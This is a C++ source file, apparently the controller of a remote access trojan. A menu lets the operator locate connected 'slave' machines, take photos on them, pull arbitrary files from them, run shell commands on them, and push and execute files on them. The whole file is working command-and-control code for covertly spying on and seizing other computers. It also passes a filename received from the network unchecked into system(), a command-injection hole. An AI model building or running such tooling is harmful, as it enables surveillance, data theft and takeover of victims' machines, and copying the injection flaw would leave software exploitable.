#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/epoll.h>
#include <netdb.h>
#include "control.h"

using namespace std;

//分成两个线程跑，主线程负责选择实施的方案
//第二个线程负责接受对端的连接和方案的处理

template <typename TYPE, void (TYPE::*thread_fun)()>
void *out_thread(void *para)
{
    TYPE *This = ((control *)para);

    This->thread_fun();

    return NULL;
}

control::~control()
{
    //等待线程终止，关闭所有的描述符并且销毁使用的空间
    pthread_join(m_tid, NULL);
    close_vec_map();
    close(m_sockfd);
}

void control::init_sock()
{
    struct sockaddr_in seraddr;
    socklen_t len = sizeof(seraddr);
    control *c = this;
    int opt = 1;

    m_epoll_fd = epoll_create(g_supervisor_fd_sz);
    if(m_epoll_fd < 0){
        perror("");
        exit(1);
    }
    m_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(m_sockfd < 0){
        perror("");
        exit(1);
    }
    if(0 > setsockopt(m_sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))){
        perror("");
        cout << "set port reuse failed" << endl;
    }
    seraddr.sin_family = AF_INET;
    seraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    seraddr.sin_port = htons(m_port);
    if(0 > bind(m_sockfd, (struct sockaddr *)&seraddr, len)){
        perror("");
        exit(1);
    }
    if(0 > listen(m_sockfd, 5)){
        perror("");
        exit(1);
    }
    //创建udp的fd专门接收控制端上线的请求
    m_udpfd = socket(AF_INET, SOCK_DGRAM, 0);
    seraddr.sin_family = AF_INET;
    seraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    seraddr.sin_port = htons(g_broad_port);
    if(0 > bind(m_udpfd, (sockaddr *)&seraddr, len)){
        perror("");
        exit(1);
    }
    epoll_add(m_epoll_fd, m_sockfd, EPOLLIN);
    epoll_add(m_epoll_fd, m_udpfd, EPOLLIN);
    pthread_create(&m_tid, NULL, out_thread<control, &control::thread_fun>, c);
}


void control::find_computer()
{
    vector<int>::iterator it;
    int fd = 0;
    sock_data *d;
    size_t len = 0;
    int flag = 0;

    it = m_v_fd.begin();
    d = (sock_data *)malloc(sizeof(sock_data));
    for(; it != m_v_fd.end(); ++it){
        fd = *it;
        d->state = LIVING;
        //如果挂掉了，那么发送会出错，直接删除容器中的值
        if(0 > send(fd, d, len, 0)){
            m_v_fd.erase(it);
            m_map_addr.erase(fd);
        }else{
            cout << m_map_addr[*it] << " is slave!!" << endl;
            flag = 1;
        }
    }
    if(flag == 0){
        cout << "No slave" << endl;
    }
    //申请之后要销毁
    free(d);
}

const int control::find_fd(const char *addr)
{
    map<int, char *>::iterator it;

    it = m_map_addr.begin();
    for(; it != m_map_addr.end(); ++it){
        if(strcmp(it->second, addr) == 0){
            return it->first;
        }
    }
    return -1;
}

void control::take_photo(int fd)
{
    sock_data *d;
    size_t len;

    if(fd == -1){
        cout << "input ip is ERROR!! please input again" << endl;
        return ;
    }
    d = (sock_data *)malloc(sizeof(sock_data));
    memset(d, 0, sizeof(sock_data));
    len = sizeof(sock_data);
    d->state = TAKE_P;
    send(fd, d, len, 0);
    free(d);
    cout << "you can do other thing, photo will display when i get it" << endl;
}

void control::get_file(int fd, const char *path)
{
    sock_data *d;
    size_t len;

    if(fd == -1){
        cout << "input ip is ERROR!! please input again" << endl;
        return ;
    }
    d = (sock_data *)malloc(sizeof(sock_data)+strlen(path));
    memset(d, 0, sizeof(sock_data)+strlen(path));
    d->len = strlen(path);
    memcpy(d->buf, path, d->len);
    d->state = UPLOAD_F;
    len = sizeof(sock_data) + strlen(path);
    send(fd, d, len, 0);
    free(d);
    cout << "you can do other thing, file get will tell you!" << endl;
}

void control::exe_file(int fd, const char *file)
{
    sock_data *d;
    size_t len;
    char ip[20];

    if(fd == -1){
        cout << "input ip is ERROR!! please input again" << endl;
        return ;
    }
    d = (sock_data *)malloc(sizeof(sock_data)+strlen(file));
    memset(d, 0, sizeof(sock_data)+strlen(file));
    d->len = strlen(file);
    memcpy(d->buf, file, d->len);
    d->state = EXE_F;
    len = sizeof(sock_data) + strlen(file);
    cout << "the file is tranferring to slave machine" << endl;
    memcpy(ip, m_map_addr[fd], strlen(m_map_addr[fd]));
    upload_file(fd, file, len, EXE_F);
    free(d);
    cout << "you can do other thing, exe file end will tell you!" << endl;
}

void control::exe_cmd(int fd, const char *cmd)
{
    sock_data *d;
    size_t len;

    if(fd == -1){
        cout << "input ip is ERROR!! please input again" << endl;
        return ;
    }
    d = (sock_data *)malloc(sizeof(sock_data)+strlen(cmd));
    memset(d, 0, sizeof(sock_data)+strlen(cmd));
    d->len = strlen(cmd);
    memcpy(d->buf, cmd, d->len);
    d->state = EXE_C;
    len = sizeof(sock_data) + strlen(cmd);
    send(fd, d, len, 0);
    free(d);
    cout << "you can do other thing, cmd result will tell you!" << endl;
}

void sig_pipe(int sig)
{
}

int control::choose()
{
    int num;
    int fd = 0;
    char ip[20]    = {0};
    char path[255] = {0};
    char cmd[255]  = {0};

    cout << "************************************" << endl;
    cout << "***  PLEASE   CHOOSE   MODEL     ***" << endl;
    cout << "***  1. find who are supervisor  ***" << endl;
    cout << "***  2. give a ip and take photo ***" << endl;
    cout << "***  3. give a ip and get file   ***" << endl;
    cout << "***  4. give a ip and exe cmd    ***" << endl;
    cout << "***  5. give a ip and exe a file ***" << endl;
    cout << "***  6. quit                     ***" << endl;
    cout << "************************************" << endl;
    cout << "please input number:" << endl;
    signal(SIGPIPE, sig_pipe);
    cin >> num;
    switch(num){
        case 1:
            find_computer();
            break;
        case 2:
            cout << "please input addr:";
            cin >> ip;
            fd = find_fd(ip);
            take_photo(fd);
            break;
        case 3:
            cout << "please input addr:";
            cin >> ip;
            cout << "please input file path:";
            cin >> path;
            fd = find_fd(ip);
            get_file(fd, path);
            break;
        case 4:
            cout << "please input addr:";
            cin >> ip;
            cout << ip << endl;
            cin.getline(cmd, 255);
            cout << "please input cmd:";
            cin.getline(cmd, 255);
            cout << cmd << endl;
            fd = find_fd(ip);
            exe_cmd(fd, cmd);
            break;
        case 5:
            cout << "please input addr:";
            cin >> ip;
            cout << "please input file path:";
            cin >> path;
            fd = find_fd(ip);
            exe_file(fd, path);
            break;
        case 6:
            pthread_kill(m_tid, SIGINT);
            return 1;
        default:
            cout << "please input correct num" << endl;
            break;
    }
    return 0;
}

void control::close_vec_map()
{
    vector<int>::iterator it;

    it = m_v_fd.begin();
    for(; it != m_v_fd.end(); ++it){
        //关闭所有的描述符
        close(*it);
    }
    m_v_fd.clear();//销毁vector
    m_map_addr.clear();//销毁map
}
void sig_int(int sig)
{
    pthread_exit(NULL);
}

void control::thread_fun()
{
    signal(SIGINT, sig_int);
    deal_event();
}

//分支线程处理事件
void control::deal_event()
{
    int nfds = 0;
    int fd = 0;
    int buf_fd = 0;
    struct epoll_event events[g_supervisor_fd_sz];
    struct sockaddr_in cliaddr;
    socklen_t len = sizeof(struct sockaddr_in);
    size_t recv_len = 1460;
    sock_data *d;
    char addr[100][20];//用于存放每个客户端的地址，设置为100个受控端
    char *str = NULL;
    int count = 0;
    int recv_sz = 0;
    int offset = 0;
    int left_read = recv_len;
    vector<int>::iterator it;

    for(;;){
        nfds = epoll_wait(m_epoll_fd, events, g_supervisor_fd_sz, 0);
        for(int i = 0; i < nfds; ++i){
            if(m_sockfd == (fd = events[i].data.fd)){
                buf_fd = accept(m_sockfd, (sockaddr *)&cliaddr, &len);
                if(buf_fd < 0){
                    perror("");
                }else{
                    epoll_add(m_epoll_fd, buf_fd, EPOLLIN);
                    m_v_fd.push_back(buf_fd);
                    //有坑，map存放的value（地址）必须为每个客户端
                    //创造一个内存来维护
                    str = inet_ntoa(cliaddr.sin_addr);
                    if(count > 100){
                        cout << "control machine too many，can't control this!!" << endl;
                        continue;
                    }
                    memcpy((char *)(addr[count]), str, strlen(str));
                    m_map_addr[buf_fd] = addr[count];
                    ++count;
                }
            }else if(fd == m_udpfd){
                //接收数据，并且发送，让受控端知晓控制端的ip
                char buf[255] = {0};
                recvfrom(m_udpfd, buf, 255, 0, (sockaddr *)&cliaddr, NULL);
                memset(&cliaddr, 0, sizeof(sockaddr));
                cliaddr.sin_family = AF_INET;
                inet_aton(buf, &cliaddr.sin_addr);
                cliaddr.sin_port = htons(g_cliudp_port);
                sendto(m_udpfd, buf, strlen(buf), 0, (sockaddr *)&cliaddr, sizeof(cliaddr));
            }else if(events[i].events & EPOLLIN){
                if(offset == 0){
                    d = (sock_data *)malloc(sizeof(sock_data) + g_max_send_sz);
                    len = sizeof(sock_data) + g_max_send_sz;
                }
                //接受长度为0，说明对段关闭
                recv_sz = recv(fd, (char *)d+offset, left_read, 0);
                if(0 == recv_sz){
                    epoll_del(m_epoll_fd, fd, EPOLLIN);
                    //删除对应的容器中的值
                    for(it = m_v_fd.begin(); it != m_v_fd.end(); ++it){
                        if(*it == fd){
                            m_v_fd.erase(it);
                            break;
                        }
                    }
                    offset = 0;
                    left_read = recv_len;
                    m_map_addr.erase(fd);
                    close(fd);
                    continue;
                }else if(recv_sz < left_read){
                    //解决tcp的数据连续性
                    //应为对于一个socket读取，可能只读取了一部分
                    //所以就要循环等待读取另一部分，读完才进入处理模块
                    if(d->len == recv_sz-sizeof(sock_data)){
                        left_read = recv_len;
                        goto DEAL;
                    }
                    left_read -= recv_sz;
                    offset += recv_sz;
                    continue;
                }
DEAL:
                if(recv_sz == left_read)
                    recv_sz = recv_len;
                offset = 0;
                left_read = recv_len;
                deal_data(d, fd, recv_sz);
                free(d);
            }
        }
    }
}

//接收数据，进行处理
void control::deal_data(sock_data *d, int fd, size_t recv_len)
{
    int file_fd = 0;
    char name[255] = {0};
    char dirname[255] = {0};
    FILE *fp = NULL;
    char cmd[255] = {0};
    int last_pos = 0;

    switch(d->state)
    {
        case TAKE_P:
            sprintf(dirname, "%s/%s", "/tmp", strtok(d->filename, "-"));
            mkdir(dirname, 0755);
            sprintf(name, "%s/%s", dirname, strtok(NULL, "-"));
            file_fd = open(name, O_RDWR | O_CREAT, 0644);
            lseek(file_fd, 0, SEEK_END);
            write(file_fd, d->buf, d->len);
            if(d->len < g_max_send_sz){
                sprintf(cmd, "%s %s", "eog", name);
                system(cmd);
            }
            close(file_fd);
            break;
        case EXE_C:
            cout << d->buf << endl;
            break;
        case EXE_F:
            cout << "file exe success!!" << endl;
            break;
        case UPLOAD_F:
            //把文件放置在/tmp/对应ip 这个目录下
            sprintf(dirname, "%s%s", "/tmp/", strtok(d->filename, "-"));
            mkdir(dirname, 0644);
            sprintf(name, "%s/%s", dirname, strtok(NULL, "-"));
            //如果没有打开那么就创建
            file_fd = open(name, O_RDWR | O_CREAT, 0644);
            lseek(file_fd, 0, SEEK_END);
            write(file_fd, d->buf, d->len);
            if(d->len < g_max_send_sz){
                cout << name << " already uploaded" << endl;
            }
            close(file_fd);
            break;
        case EXE_FAILED:
            cout << "file exe failed" << endl;
            break;
        default:
            break;
    }
}

const int control::get_fd()
{
    return m_sockfd;
}
